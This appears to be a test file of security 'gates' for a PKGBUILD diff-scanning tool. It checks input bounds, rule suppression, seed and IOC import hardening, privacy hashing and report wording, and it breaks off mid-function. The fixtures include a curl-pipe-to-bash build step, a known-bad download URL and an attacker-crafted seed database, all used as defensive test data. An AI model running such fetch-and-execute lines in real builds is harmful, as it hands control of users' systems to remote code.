def gate_differ_hostile_input_is_bounded() -> Gate:
    """Differ helpers remain quick and bounded on hostile synthetic input."""
    from trustsight.differ import (
        MAX_URLS_PER_SIDE,
        extract_urls_from_diff,
        map_diff_lines,
    )

    diff = "+" + "https://evil.example/" + ("x" * 8192) + "\n"
    diff += "+https://x.example/ok\n" * (MAX_URLS_PER_SIDE + 100)
    start = time.monotonic()
    changes = extract_urls_from_diff(diff)
    mapping = map_diff_lines("+outside-hunk\n+++ b/PKGBUILD\n@@ malformed\n+payload\n")
    elapsed = time.monotonic() - start
    problems = []
    if elapsed >= 2.0:
        problems.append(f"{elapsed:.2f}s for hostile URL diff")
    if len(changes.added_urls) > MAX_URLS_PER_SIDE:
        problems.append("URL result exceeded its bound")
    if mapping:
        problems.append("content outside a file header/hunk was mapped")
    return Gate("differ hostile input is bounded", not problems, problems or round(elapsed, 3))


def gate_differ_output_is_deterministic() -> Gate:
    """Repeated differ extraction has stable ordering and values."""
    from trustsight.differ import extract_urls_from_diff

    diff = "+https://z.example/a https://a.example/b https://z.example/a\n"
    first = extract_urls_from_diff(diff)
    second = extract_urls_from_diff(diff)
    passed = first == second and first.added_urls == sorted(first.added_urls)
    return Gate("differ output is deterministic", passed, first.added_urls)


def gate_api_inputs_are_bounded_before_initialization() -> Gate:
    """Public API rejects oversized input before touching analysis state."""
    from trustsight.api import MAX_API_NAME_BYTES, MAX_API_TEXT_BYTES, TrustSight

    client = TrustSight()
    touched = []

    def mark_ready():
        touched.append(True)

    client._ensure_ready = mark_ready
    problems = []
    cases = (
        ("inspect", lambda: client.inspect("x" * (MAX_API_NAME_BYTES + 1), check_aur=False)),
        ("text", lambda: client.analyze_text("demo", "x" * (MAX_API_TEXT_BYTES + 1))),
        ("pivot", lambda: client.pivot("x" * (MAX_API_NAME_BYTES + 1))),
    )
    for label, call in cases:
        try:
            call()
        except ValueError:
            continue
        except Exception as exc:
            problems.append(f"{label} raised {type(exc).__name__}, not ValueError")
        else:
            problems.append(f"{label} accepted oversized input")
    if touched:
        problems.append("initialization occurred before validation")
    return Gate(
        "API inputs are bounded before initialization",
        not problems,
        problems or len(cases),
    )


def gate_maturity_numbers_are_not_duplicated() -> Gate:
    """B3's two numbers are the constant, not a copy of it.

    The doc states 50 (where novelty reaches full weight) and 25 (half of
    it, where the Inconclusive downgrade stops applying).  Both are
    derived from one constant, and a page that restates a constant will
    eventually restate a stale one, so the page is checked against the
    value and the behaviour is checked against the predicate.
    """
    from trustsight.schema import NoveltyContext
    from trustsight.scoring import _MATURITY_THRESHOLD, calculate_score, maturity

    problems = []
    half = _MATURITY_THRESHOLD // 2

    doc = (ROOT / "docs" / "security.md").read_text()
    section = doc.split("### B3.")[-1].split("\n### ")[0]
    if f"**{_MATURITY_THRESHOLD}**" not in section:
        problems.append(f"B3 does not state the threshold ({_MATURITY_THRESHOLD})")
    if f"fewer than {half}" not in section:
        problems.append(f"B3 does not state the half point ({half})")

    # The predicate itself: Medium band, cold, nothing strong -> Inconclusive.
    if maturity(half) != 0.5 or maturity(_MATURITY_THRESHOLD) != 1.0:
        problems.append("the maturity ramp does not reach 0.5 and 1.0 where stated")

    weak = [{"rule_id": "R050", "severity": "MEDIUM", "name": "w", "match": ""}] * 2
    cold = NoveltyContext(observation_count=half - 1)
    warm = NoveltyContext(observation_count=_MATURITY_THRESHOLD)
    _s, _b, cold_level = calculate_score(weak, {}, cold)
    _s, _b, warm_level = calculate_score(weak, {}, warm)
    if cold_level != "Inconclusive":
        problems.append(f"a cold Medium was reported {cold_level!r}")
    if warm_level == "Inconclusive":
        problems.append("a warm Medium was downgraded")

    strong = weak + [{"rule_id": "R001", "severity": "HIGH", "name": "s", "match": ""}]
    _s, _b, strong_level = calculate_score(strong, {}, cold)
    if strong_level == "Inconclusive":
        problems.append("a HIGH finding was downgraded by the cold-start rule")

    return Gate("the maturity numbers are derived, not copied", not problems,
                problems or {"threshold": _MATURITY_THRESHOLD, "half": half})


def gate_fatal_rules_cannot_be_removed() -> Gate:
    """Deleting or downgrading a FATAL rule in rules.toml does not work."""
    from trustsight.config import (
        enforce_fatal_rules, shipped_fatal_rule_ids, shipped_rules,
    )

    fatal_ids = shipped_fatal_rule_ids()
    problems = []
    if not fatal_ids:
        problems.append("no shipped rule is FATAL")
    for rid in fatal_ids:
        deleted = [r for r in shipped_rules() if r["id"] != rid]
        effective, restored = enforce_fatal_rules(deleted)
        if rid not in restored or not any(
            r["id"] == rid and r["severity"] == "FATAL" for r in effective
        ):
            problems.append(f"{rid} stayed deleted")

        downgraded = [
            dict(r, severity="INFO") if r["id"] == rid else r
            for r in shipped_rules()
        ]
        effective, restored = enforce_fatal_rules(downgraded)
        if rid not in restored or not any(
            r["id"] == rid and r["severity"] == "FATAL" for r in effective
        ):
            problems.append(f"{rid} stayed downgraded")
    return Gate("FATAL rules cannot be switched off", not problems,
                problems or fatal_ids)


def gate_fatal_findings_cannot_be_suppressed() -> Gate:
    """An override never hides a FATAL finding, whatever the file says."""
    import trustsight.override as override_module

    saved = override_module.load_overrides
    override_module.load_overrides = lambda: [
        override_module.RuleOverride(rule_id="R012", reason="test", package=None),
        override_module.RuleOverride(rule_id="R055", reason="test", package=None),
    ]
    try:
        kept, suppressed = override_module.filter_triggered_rules([
            {"rule_id": "R012", "severity": "FATAL", "name": "x"},
            {"rule_id": "R055", "severity": "MEDIUM", "name": "y"},
        ])
    finally:
        override_module.load_overrides = saved

    problems = []
    if not any(r["rule_id"] == "R012" for r in kept):
        problems.append("a FATAL finding was suppressed")
    if not any(r["rule_id"] == "R055" for r in suppressed):
        problems.append("a suppressed finding was discarded instead of reported")
    return Gate("FATAL findings survive every override", not problems, problems)


def gate_seed_cannot_rewrite_the_database() -> Gate:
    """A seed describes itself; it does not get to set anything else."""
    import sqlite3
    import tempfile

    import trustsight.db as db

    from calibration_gates import shipped_config

    problems = []
    with shipped_config():
        db.init_db()
        db.set_metadata("baseline_provenance", "local")

        # A locally learned maintainer count: the seed must not be able to
        # raise it, because a high count is what makes H026/H044 stay quiet.
        with db.get_connection() as local:
            local.execute(
                "INSERT OR REPLACE INTO maintainer_counts (name, count) "
                "VALUES ('victim', 1)"
            )
            local.commit()

        seed_path = Path(tempfile.mkstemp(suffix=".db")[1])
        conn = sqlite3.connect(seed_path)
        conn.executescript(
            """
            CREATE TABLE metadata (key TEXT PRIMARY KEY, value TEXT);
            CREATE TABLE source_urls (
                url TEXT PRIMARY KEY, first_seen_package_id INTEGER,
                first_seen_globally_timestamp INTEGER, total_uses INTEGER,
                last_seen_timestamp INTEGER);
            CREATE TABLE maintainers (
                name TEXT PRIMARY KEY, package_count INTEGER,
                first_seen_timestamp INTEGER, last_seen_timestamp INTEGER);
            CREATE TABLE maintainer_counts (name TEXT PRIMARY KEY, count INTEGER);
            INSERT INTO metadata VALUES ('seed_observation_count', '100');
            INSERT INTO metadata VALUES ('baseline_provenance', 'ATTACKER');
            INSERT INTO maintainer_counts VALUES ('victim', 9999);
            """
        )
        conn.commit()
        conn.close()

        db.import_seed(seed_path)
        if db.get_metadata("baseline_provenance") != "local":
            problems.append("the seed overwrote a key it does not own")
        if db.get_metadata(db.SEED_OBSERVATION_KEY) != "100":
            problems.append("the seed's own key was not applied")
        if not db.get_metadata(db.SEED_DIGEST_KEY):
            problems.append("the imported seed's digest was not recorded")
        with db.get_connection() as local:
            row = local.execute(
                "SELECT count FROM maintainer_counts WHERE name = 'victim'"
            ).fetchone()
        if row is None or row["count"] != 1:
            problems.append("the seed overwrote a locally learned maintainer count")
        seed_path.unlink(missing_ok=True)
    return Gate("a seed cannot rewrite the database", not problems, problems)


def gate_hashed_maintainers_protect_privacy() -> Gate:
    """P1: after seeding, maintainer identities are stored only as salted hashes.

    The v0.12.0 seed format never writes plaintext names or emails.  The
    local database mirrors that invariant: the hashed maintainer table has
    no plaintext columns, and a seeded database always carries the salt
    needed to reproduce the hashes.
    """
    import shutil
    import sqlite3
    import tempfile

    import trustsight.db as db
    import trustsight.seed_build as seed_build

    from calibration_gates import shipped_config

    problems = []
    with shipped_config():
        db.init_db()

        # Build a tiny v2 seed from raw maintainer records.
        raw = [
            {"name": "Alice Example", "email": "alice@example.com",
             "packages": ["pkg-a"], "source": "aur"},
            {"name": "Bob Builder", "packages": ["pkg-b"], "source": "aur"},
        ]
        seed_dir = Path(tempfile.mkdtemp(prefix="trustsight-seed-"))
        try:
            seed_build.build_seed(raw, seed_dir)
            db.import_seed(seed_dir)

            with db.get_connection() as local:
                # Hashed table must not contain plaintext identity columns.
                columns = {
                    row["name"]
                    for row in local.execute(
                        "PRAGMA table_info(maintainers_hashed)"
                    ).fetchall()
                }
                for forbidden in ("name", "email"):
                    if forbidden in columns:
                        problems.append(
                            f"maintainers_hashed has plaintext '{forbidden}' column"
                        )

                # A seeded database must have a stored salt.
                salt = db._get_salt(local)
                if not salt:
                    problems.append("seed_meta.salt is missing after seed import")

                # No plaintext maintainer names should remain in the active
                # maintainer tables.
                for forbidden in ("Alice Example", "Bob Builder", "alice@example.com"):
                    for table in ("maintainers_hashed", "package_maintainers_hashed"):
                        try:
                            rows = local.execute(
                                f"SELECT 1 FROM {table} WHERE name_hash = ? OR email_hash = ?",
                                (forbidden, forbidden),
                            ).fetchall()
                        except sqlite3.OperationalError:
                            continue
                        if rows:
                            problems.append(
                                f"plaintext value '{forbidden}' found in {table}"
                            )
        finally:
            shutil.rmtree(seed_dir, ignore_errors=True)
    return Gate("hashed maintainers protect privacy", not problems, problems)


def _seed_ioc_baseline(source: str = "test-feed", expires_at: str = ""):
    """Import a tiny IOC baseline into the current db; return its entries."""
    import json
    import tempfile

    import trustsight.ioc_baseline as ioc

    base = Path(tempfile.mkdtemp(prefix="trustsight-ioc-"))
    manifest = {
        "version": 1, "source": source, "created_at": ioc._now_iso(),
        "expires_at": "", "signature": "", "public_key": "",
    }
    (base / "manifest.json").write_text(json.dumps(manifest))
    rows = [
        {"type": "domain", "value": "malware.example", "source": source,
         "confidence": "high", "provenance": "ASA-2026-0001",
         "campaign": "2026-06", "expires_at": expires_at},
        {"type": "hash", "value": "a" * 64, "source": source,
         "confidence": "high", "provenance": "vendor", "expires_at": expires_at},
    ]
    (base / "iocs.jsonl").write_text("\n".join(json.dumps(r) for r in rows))
    ioc.import_baseline(base, allow_unsigned=True)
    return base


def gate_ioc_match_carries_source() -> Gate:
    """A13b: an IOC finding is attribution, so it names who called it bad.

    Every IocMatch the analysis produces must carry a non-empty ``source``;
    a match that cannot say which curator flagged the artifact is aggregation,
    not attribution, and A13b forbids merging IOCs into an anonymous set.
    """
    import shutil

    import trustsight.config as config_module
    import trustsight.db as db
    from trustsight.analysis.ioc_match import ioc_baseline_matches
    from calibration_gates import shipped_config

    problems: list[str] = []
    with shipped_config():
        db.init_db()
        base = _seed_ioc_baseline()
        # The stage reads config via load_config(); enable the baseline there.
        cfg = config_module.load_config()
        cfg.setdefault("baselines", {})["ioc"] = {"enabled": True, "sources": []}
        saved = config_module.load_config
        config_module.load_config = lambda: cfg
        try:
            diff = "+source=('https://malware.example/x.tar.gz')\n"
            matches = ioc_baseline_matches(diff, package_name="demo")
        finally:
            config_module.load_config = saved
            shutil.rmtree(base, ignore_errors=True)
        if not matches:
            problems.append("a known-bad domain produced no IOC match")
        for m in matches:
            if not getattr(m, "source", ""):
                problems.append(f"IOC match for {m.value!r} carries no source")
    return Gate("an IOC match carries its source", not problems, problems)


def gate_ioc_no_score_contribution() -> Gate:
    """B1: an IOC match is detection, not a weighted finding.

    IOC matches live on ``PackageFact.ioc_matches``, never in
    ``score_breakdown``, and never move the number.  The same PKGBUILD scores
    identically whether or not a known-bad indicator matches: the IOC is
    reported alongside the score, it does not become part of it.
    """
    import shutil

    import trustsight.config as config_module
    import trustsight.db as db
    from trustsight.analysis import scan_diff
    from calibration_gates import shipped_config

    problems: list[str] = []
    with shipped_config():
        db.init_db()
        base_cfg = config_module.load_config()
        diff = "+source=('https://malware.example/x.tar.gz')\n"

        saved = config_module.load_config
        try:
            # Baseline disabled: reference score, no IOC stage.
            base_cfg.setdefault("baselines", {})["ioc"] = {"enabled": False}
            config_module.load_config = lambda: base_cfg
            base_fact = scan_diff(diff, config=base_cfg, package_name="demo", seen_urls={})

            base = _seed_ioc_baseline()
            base_cfg["baselines"]["ioc"] = {"enabled": True, "sources": []}
            matched = scan_diff(diff, config=base_cfg, package_name="demo", seen_urls={})
        finally:
            config_module.load_config = saved
            shutil.rmtree(base, ignore_errors=True)

        if not matched.ioc_matches:
            problems.append("the known-bad domain produced no IOC match")
        if matched.final_score != base_fact.final_score:
            problems.append(
                f"IOC match changed the score {base_fact.final_score} -> "
                f"{matched.final_score}"
            )
        for e in matched.score_breakdown:
            if "ioc" in (e.rule_id or "").lower():
                problems.append(f"an IOC entry appeared in score_breakdown: {e.rule_id}")
    return Gate("IOC matches never contribute to the score", not problems, problems)


def gate_ioc_expired_is_never_silent() -> Gate:
    """An expired IOC is reported as expired, not silently dropped or flagged.

    ``active_iocs`` excludes expired entries from matching by default, so a
    stale indicator does not keep flagging forever; but it must remain
    retrievable and labelled expired, so a reviewer is never told an
    indicator was clean when it had merely lapsed.
    """
    import shutil

    import trustsight.db as db
    import trustsight.ioc_baseline as ioc
    from calibration_gates import shipped_config

    problems: list[str] = []
    with shipped_config():
        db.init_db()
        base = _seed_ioc_baseline(source="stale-feed", expires_at="2000-01-01T00:00:00Z")
        try:
            default = ioc.active_iocs(source="stale-feed")
            if default:
                problems.append("an expired IOC still matched by default")
            including = ioc.active_iocs(source="stale-feed", expired=True)
            if not including:
                problems.append("an expired IOC could not be retrieved even with expired=True")
            for e in including:
                if not ioc._is_expired(e.expires_at):
                    problems.append("expired retrieval returned a non-expired entry")
        finally:
            shutil.rmtree(base, ignore_errors=True)
    return Gate("an expired IOC is never silent", not problems, problems)


def gate_ioc_not_in_config_layer() -> Gate:
    """Config separation: IOCs are state, not evaluation logic.

    The shipped rules/patterns/thresholds config carries no ``ioc`` table.
    IOCs are observations about the world and live in the baseline layer
    (A13); letting them into the rule config would make an override or a
    weight able to reach them, which is exactly what the IOC gate forbids.
    """
    import tomllib

    from trustsight.config import DEFAULT_PATTERNS, DEFAULT_RULES, DEFAULT_THRESHOLDS

    problems: list[str] = []
    for name, blob in (
        ("rules", DEFAULT_RULES),
        ("patterns", DEFAULT_PATTERNS),
        ("thresholds", DEFAULT_THRESHOLDS),
    ):
        try:
            data = tomllib.loads(blob)
        except tomllib.TOMLDecodeError as exc:
            problems.append(f"{name} config does not parse: {exc}")
            continue
        for key in data:
            if "ioc" in str(key).lower():
                problems.append(f"{name} config carries an ioc-shaped key: {key}")
    return Gate("IOCs are not in the rule config layer", not problems, problems)


def gate_seed_hash_is_deterministic() -> Gate:
    """Reproducibility: same input and salt always produce the same hash.

    The seed is only reproducible, and a lookup only lands, if hashing is a
    pure function of (salt, value).  A salt change must change the hash, or
    the per-seed salt would not be defeating precomputed tables.
    """
    from trustsight.seed_build import _hash_value

    problems: list[str] = []
    salt_a, salt_b = "a" * 64, "b" * 64
    v = "alice@example.com"
    if _hash_value(v, salt_a) != _hash_value(v, salt_a):
        problems.append("hashing the same value twice gave different results")
    if _hash_value(v, salt_a) == _hash_value(v, salt_b):
        problems.append("a different salt produced the same hash")
    if _hash_value("a@x", salt_a) == _hash_value("b@x", salt_a):
        problems.append("two different values collided under one salt")
    return Gate("the seed hash is deterministic", not problems, problems)


def gate_every_producer_accounts_for_coverage() -> Gate:
    """Every construction of a PackageFact declares what it examined.

    Enumerated from the source rather than from the paths a test happens
    to call.  Four of the five producers set ``coverage_gaps``; the fifth,
    the first-analysis path, declared ``tree_analyzed=True`` having read
    no tree at all and reported a bare "Low".  A producer added later
    fails here rather than shipping a result that silently claims full
    coverage.
    """
    hits: list[str] = []
    found = 0
    for path in _python_files():
        tree = ast.parse(path.read_text())
        for node in ast.walk(tree):
            if not isinstance(node, ast.Call):
                continue
            if _call_name(node).split(".")[-1] != "PackageFact":
                continue
            found += 1
            kwargs = {kw.arg for kw in node.keywords}
            if "coverage_gaps" not in kwargs:
                hits.append(f"{_rel(path)}:{node.lineno} no coverage_gaps=")
            # tree_analyzed=True as a literal is a claim, not a measurement.
            for kw in node.keywords:
                if kw.arg == "tree_analyzed" and isinstance(kw.value, ast.Constant):
                    if kw.value.value is True:
                        hits.append(
                            f"{_rel(path)}:{node.lineno} tree_analyzed hardcoded True"
                        )
    if not found:
        hits.append("no PackageFact construction found: the check sees nothing")
    return Gate("every result declares its coverage", not hits, hits or found)


def gate_a_gap_is_always_shown_with_the_band() -> Gate:
    """A reviewer never sees a bare band for an incomplete analysis.

    ``fail_closed`` lets a HIGH keep its band, which leaves the decoy
    move: pad past the cap, put the payload after the cut, and include
    one cheap deliberate HIGH in the visible prefix.  The verdict then
    reads "High" and the reviewer anchors on the decoy.  So the band a
    person is shown carries the caveat wherever it appears.
    """
    from trustsight.coverage import DIFF_TRUNCATED, INCOMPLETE_SUFFIX, qualified_band
    from trustsight.schema import PackageFact
    from trustsight.scoring import verdict_label, verdict_level

    problems = []
    for band in ("Low", "Medium", "High", "Critical"):
        if qualified_band(band, [DIFF_TRUNCATED]) != band + INCOMPLETE_SUFFIX:
            problems.append(f"{band} was shown bare despite a gap")
        if qualified_band(band, []) != band:
            problems.append(f"{band} was qualified without a gap")

    decoy = PackageFact(final_score=75, risk="High", coverage_gaps=[DIFF_TRUNCATED])
    if verdict_label(decoy) != "High" + INCOMPLETE_SUFFIX:
        problems.append("the decoy case rendered as a bare High")
    if verdict_level(decoy) != "High":
        problems.append("the machine-readable band was polluted with prose")

    # Every human-facing render must go through verdict_label, never
    # verdict_level: the two differ only here, so a display path using the
    # wrong one is exactly the regression this gate exists to catch.
    for module in ("cli/review.py", "cli/inspect.py"):
        text = (SRC / module).read_text()
        for lineno, line in enumerate(text.splitlines(), start=1):
            if "verdict_level(" in line and "risk_label" not in line and '"risk"' not in line:
                if "risk = verdict_level(fact)" not in line:
                    problems.append(f"{module}:{lineno} displays a bare band")
    return Gate("a coverage gap is always shown with the band", not problems, problems)


def gate_reserved_names_are_refused_everywhere() -> Gate:
    """No writer accepts a package name the rest of the code treats as internal.

    ``packages`` is guarded because ``upsert_package`` checks, but
    ``package_profiles`` and ``pkgbuild_snapshots`` are keyed by
    ``package_name`` directly and were not.  Both are on the
    ``import_baseline`` path, and AUR names may begin with an underscore,
    so ``__seed__`` is a name someone could register.  Every writer that
    takes a package name is checked here rather than three of them.
    """
    import trustsight.db as db

    from calibration_gates import shipped_config

    writers = [
        ("upsert_package", lambda n: db.upsert_package(n, "1.0")),
        ("save_package_profile", lambda n: db.save_package_profile(n, 1, "Low")),
        ("save_pkgbuild_snapshot", lambda n: db.save_pkgbuild_snapshot(n, "x", "1")),
    ]
    problems = []
    with shipped_config():
        db.init_db()
        for name in ("__seed__", "__evil", "__"):
            for label, call in writers:
                try:
                    call(name)
                    problems.append(f"{label} accepted {name!r}")
                except ValueError:
                    pass
        # ...and an ordinary name is still writable.
        for label, call in writers:
            try:
                call("ordinary-pkg")
            except ValueError:
                problems.append(f"{label} rejected an ordinary name")
    return Gate("reserved names are refused by every writer", not problems, problems)


def gate_a_baseline_supplies_state_not_rules() -> Gate:
    """A corpus baseline is prior state; it cannot change what a rule does.

    The importer writes package profiles, PKGBUILD snapshots and the
    metadata snapshot, and nothing else.  It never touches rules, weights,
    severities or thresholds, so a hostile-but-validly-signed baseline can
    make the present look unremarkable, exactly like a seed, but cannot
    change what any rule matches or what any finding is worth.
    """
    import trustsight.full_aur.export as export

    allowed_writers = {
        "save_package_profile", "save_pkgbuild_snapshot", "save_metadata",
    }
    forbidden = {
        "set_metadata", "load_rules", "sync_rules", "write_default_file",
        "add_override", "save_overrides",
    }
    tree = ast.parse((SRC / "full_aur" / "export.py").read_text())
    fn = next(
        node for node in ast.walk(tree)
        if isinstance(node, ast.FunctionDef) and node.name == "import_baseline"
    )
    problems = []
    for node in ast.walk(fn):
        if isinstance(node, ast.Call):
            name = _call_name(node).split(".")[-1]
            if name in forbidden:
                problems.append(f"import_baseline calls {name}()")
    written = {
        _call_name(node).split(".")[-1]
        for node in ast.walk(fn)
        if isinstance(node, ast.Call)
    }
    if not (written & allowed_writers):
        problems.append("import_baseline writes nothing the gate recognises")
    if not hasattr(export, "InvalidSignatureError"):
        problems.append("the signature check is gone")
    return Gate("a baseline supplies state, not rules", not problems, problems)


def _demo_fact(score: int = 0):
    """A small, real fact for the gates that assert on a rendered report."""
    from trustsight.analysis import scan_diff

    fact = scan_diff(
        "diff --git a/PKGBUILD b/PKGBUILD\n--- a/PKGBUILD\n+++ b/PKGBUILD\n"
        "@@ -1 +1 @@\n-pkgver=1\n+pkgver=2\n",
        package_name="demo",
    )
    if score:
        fact.final_score = score
        fact.risk = "High"
    return fact


def _render_inspect_text(fact, **kwargs) -> str:
    """The plain inspect render, captured as text."""
    from trustsight.cli import inspect as inspect_cli

    buffer = io.StringIO()
    with contextlib.redirect_stdout(buffer):
        inspect_cli._inspect_plain(fact, **kwargs)
    return buffer.getvalue()


# What the analysis package may import from a module that can reach the
# network.  None of these takes a URL: they are keyed by package name or
# commit id, so no value parsed out of a PKGBUILD can become a request.
# Reaching the network at all requires naming a package, and the host is
# then the A3 constant.
_ANALYSIS_FETCH_ALLOWED = {
    "clone_or_fetch",
    "get_head_commit",
    "get_maintainer_from_commit",
    "get_pkgbuild_at_commit",
    "get_pkgver_from_head",
    "last_fetch_time",
    # Local only, despite living in discovery.py next to the RPC: compares
    # two version strings via pacman's vercmp or pyalpm and opens no socket.
    "_vercmp",
    # Local only: iterates an already-cloned repository from a commit id.
    # Takes a repo and an OID, never a URL, so it opens no socket either.
    "walk_bounded",
}


def gate_source_urls_are_never_fetched() -> Gate:
    """Nothing derived from a PKGBUILD reaches a network call.

    Checked structurally, in two parts, because the analysis package is not
    transport-free: ``analysis/pipeline.py`` imports ``fetcher`` and calls
    ``clone_or_fetch`` to obtain the package's own AUR repository.  What
    holds is narrower and is what A2 actually promises.

    First, no raw transport library is imported, so the analysis package
    cannot open a connection of its own.  Second, everything it does import
    from a fetch module is on the name-keyed allowlist above: those take a
    package name or a commit id, never a URL, so a ``source=`` entry has
    nowhere to go.  Widening the allowlist with a URL-taking helper is the
    change that would reintroduce SSRF, and it fails here.
    """
    hits: list[str] = []
    banned = {"urllib.request", "http.client", "socket", "requests", "httpx", "ftplib"}
    fetch_modules = {"fetcher", "discovery", "full_aur.fetch", "full_aur.metadata"}
    for path in sorted((SRC / "analysis").rglob("*.py")):
        tree = ast.parse(path.read_text())
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    if alias.name in banned:
                        hits.append(f"{_rel(path)}:{node.lineno} {alias.name}")
            elif isinstance(node, ast.ImportFrom):
                if node.module in banned:
                    hits.append(f"{_rel(path)}:{node.lineno} {node.module}")
                    continue
                # Relative imports inside the package: ".."-prefixed module
                # names arrive as the bare tail, e.g. "fetcher".
                if (node.module or "").lstrip(".") in fetch_modules:
                    for alias in node.names:
                        if alias.name not in _ANALYSIS_FETCH_ALLOWED:
                            hits.append(
                                f"{_rel(path)}:{node.lineno} "
                                f"{node.module}.{alias.name} is not name-keyed"
                            )
    return Gate("declared source URLs are never fetched", not hits, hits)


def gate_every_json_report_carries_the_fingerprint() -> Gate:
    """B1: every machine-readable report says which instrument made it.

    Run rather than read, because the claim is about what a consumer
    receives.  `review --json` built its own dict and carried it, while
    `inspect --json` went through `display._fact_to_dict`, which did not, so
    the guarantee was true of one command and false of the other.

    Both of those now render through `reporting.report_body` (B11), so that
    is what this checks: pointing it at the old per-command helper would
    leave it passing against a function no JSON path calls any more, which
    is the same mistake in a new place.  `schema.fact_to_dict` is checked
    beside it because it is the stored `fact_json`, a third consumer.
    """
    from trustsight.config import config_fingerprint
    from trustsight.reporting import evaluate_fact, report_body
    from trustsight.schema import fact_to_dict

    fact = _demo_fact()
    expected = config_fingerprint()
    evaluated = evaluate_fact(fact)
    missing = [
        name for name, data in (
            ("schema.fact_to_dict (stored fact_json)", fact_to_dict(fact)),
            ("reporting.report_body (default)", report_body(evaluated)),
            ("reporting.report_body (--score)",
             report_body(evaluated, include_score=True)),
        )
        if data.get("config_fingerprint") != expected
    ]
    return Gate("every JSON report carries the fingerprint", not missing, missing)


def gate_suppression_is_never_hidden_by_a_flag() -> Gate:
    """B5: a suppression is in the report whatever flags were passed.

    `review --json` emitted `suppressed_rules` only under `--verbose`, so
    the default machine-readable output made a switched-off rule look
    exactly like one that never matched.  Asserted against the source of the
    JSON body: the key must not sit under a verbosity branch.
    """
    path = SRC / "cli" / "review.py"
    tree = ast.parse(path.read_text())
    hits: list[str] = []
    for node in ast.walk(tree):
        if not isinstance(node, ast.If):
            continue
        test = ast.unparse(node.test)
        if "verbose" not in test and "quiet" not in test:
            continue
        for inner in ast.walk(node):
            if isinstance(inner, ast.Constant) and inner.value == "suppressed_rules":
                hits.append(f"{_rel(path)}:{inner.lineno} under `if {test}`")
    return Gate("suppression is never hidden by a flag", not hits, hits)


def gate_the_default_output_is_not_headline_shaped() -> Gate:
    """The score is available on request, never volunteered.

    One of the guarantees in the opening list, and the only one with no
    structural check: the default render leads with evidence, and the number
    appears when `--score` or `--risk` asks for it.  A render that starts
    printing a band by default turns the tool into the verdict machine the
    thesis says it is not.
    """
    fact = _demo_fact(score=72)
    hits: list[str] = []
    for label, kwargs in (
        ("default", {}),
        ("--score", {"show_score": True}),
        ("--risk", {"show_risk": True}),
    ):
        text = _render_inspect_text(fact, **kwargs)
        leads = ("Score" in text) or ("/100" in text)
        if label == "default" and leads:
            hits.append("default inspect render volunteers the score")
        if label == "--score" and not leads:
            hits.append("--score does not show the score")
    return Gate("the default output is not headline-shaped", not hits, hits)


_ATX_PUNCT_RE = re.compile(r"[^\w\s-]")
_MD_LINK_RE = re.compile(r"\]\(([^)\s]+)\)")
_INLINE_CODE_RE = re.compile(r"`[^`]*`")


def _anchor(heading: str) -> str:
    """The slug a Markdown renderer derives from a heading."""
    text = heading.lstrip("#").strip()
    # An explicit {#id} attribute wins, as used by the rules reference.
    explicit = re.search(r"\{#([\w-]+)\}\s*$", text)
    if explicit:
        return explicit.group(1)
    text = re.sub(r"`([^`]*)`", r"\1", text)
    text = re.sub(r"\*\*?([^*]*)\*\*?", r"\1", text)
    return _ATX_PUNCT_RE.sub("", text.lower()).replace(" ", "-")


# B9.  Phrases whose plain reading is "you may proceed".  A template that
# says one of these defeats B6 no matter what B6 says, because the prose is
# what most readers act on.  Checked over the template strings rather than
# at runtime, so it costs nothing and fails the build when someone adds a
# friendly-sounding string.
_PERMISSION_PHRASES = (
    "no issues", "looks fine", "looks good", "nothing to review",
    "no need to review", "safe to install", "safe to update", "safe to build",
    "you may proceed", "good to go", "all clear", "verified safe",
    "no action needed", "no concerns", "appears safe", "is safe",
)
# "clean" is banned as a verdict word but appears legitimately in prose such
# as "a clean diff".  Only the verdict-shaped uses are denied.
_PERMISSION_REGEXES = (
    r"\bpackage is clean\b", r"\bverdict:?\s*clean\b", r"\bno risk\b",
    r"\bnothing (?:to worry|suspicious found)\b",
)


def gate_no_template_grants_permission() -> Gate:
    """B9: no rendered string says or implies that reading the diff is optional.

    Including when nothing fired.  The trivial case must state a fact, not
    issue a clearance: "Only pkgver and sha256sums changed. Review the diff
    before building."
    """
    import trustsight.findings as findings
    import trustsight.verdict as verdict

    problems = []
    # Template text only.  Substituted field values are package-controlled:
    # a package legitimately named `safe-rs` or `clean-arch` must not fail
    # the build.  This is A7's separation applied to B9, templates are
    # code-owned and checked, fields are package-owned and never checked.
    strings: list[tuple[str, str]] = [
        (f"findings.TEMPLATES[{k}]", v) for k, v in findings.TEMPLATES.items()
    ]
    for module in (verdict, findings):
        source = (SRC / Path(module.__file__).name).read_text()
        tree = ast.parse(source)
        for node in ast.walk(tree):
            # Literal segments of an f-string are template text; the
            # interpolated values are not.
            if isinstance(node, ast.JoinedStr):
                for part in node.values:
                    if isinstance(part, ast.Constant) and isinstance(part.value, str):
                        strings.append(
                            (f"{Path(module.__file__).name}:{node.lineno}", part.value))
            elif isinstance(node, ast.Constant) and isinstance(node.value, str):
                if len(node.value) >= 8 and not node.value.startswith("\n"):
                    strings.append(
                        (f"{Path(module.__file__).name}:{node.lineno}", node.value))

    for where, text in strings:
        low = text.lower()
        for phrase in _PERMISSION_PHRASES:
            if phrase in low:
                problems.append(f"{where}: {phrase!r}")
        for pattern in _PERMISSION_REGEXES:
            if re.search(pattern, low):
                problems.append(f"{where}: matches {pattern}")
    return Gate("no template grants permission to skip", not problems,
                problems or f"{len(strings)} strings checked")


def gate_content_findings_carry_a_location() -> Gate:
    """B8: a finding a reader can open and confirm is a different object
    from an assertion they must trust.

    Content rules report ``file`` and ``line``.  Rules that legitimately
    cannot (maintainer, temporal, corpus, graph) must say so explicitly:
    a missing location must not be indistinguishable from a rule that
    forgot to set one.

    Runs under ``shipped_config()`` like
    :func:`gate_declared_findings_fire_under_shipped_config`: the resolved
    rules R001/R002/R003/R012/R039-R045/R055-R057 only carry a location
    through the shipped ``match_target = "resolved"`` path, and a local
    rules.toml that overrides them to ``raw_line`` must not make this gate
    pass locally while CI fails.
    """
    from calibration_gates import shipped_config

    from trustsight.analysis import scan_diff
    from trustsight.findings import NON_CONTENT_RULES

    header = "--- a/PKGBUILD\n+++ b/PKGBUILD\n@@ -1,2 +1,8 @@\n pkgname=demo\n"
    body = (
        "+build() {\n"
        "+  curl -fsSL https://cdn.example.invalid/x.sh | bash\n"
        "+}\n"
        '+source=("https://example.invalid/a.tar.gz")\n'
        "+sha256sums=('SKIP')\n"
    )

    problems = []
    with shipped_config():
